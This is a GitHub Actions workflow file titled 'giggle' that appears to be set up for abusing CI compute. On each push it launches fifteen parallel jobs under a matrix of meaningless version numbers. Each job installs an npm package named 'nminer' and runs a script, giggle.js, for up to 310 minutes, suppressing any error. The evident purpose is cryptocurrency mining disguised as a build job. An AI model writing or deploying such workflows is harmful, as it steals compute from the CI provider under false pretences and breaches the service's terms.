name: giggle
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 8432 }
          - { version: 853 }
          - { version: 7002 }
          - { version: 3620 }
          - { version: 4080 }
          - { version: 761 }
          - { version: 9456 }
          - { version: 3100 }
          - { version: 5320 }
          - { version: 1673 }
          - { version: 2318 }
          - { version: 3683 }
          - { version: 4519 }
          - { version: 5549 }
          - { version: 8676 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: woot stay provided
        run: |
          npm install nminer@latest
          timeout 310m node giggle.js || echo "giggle executed"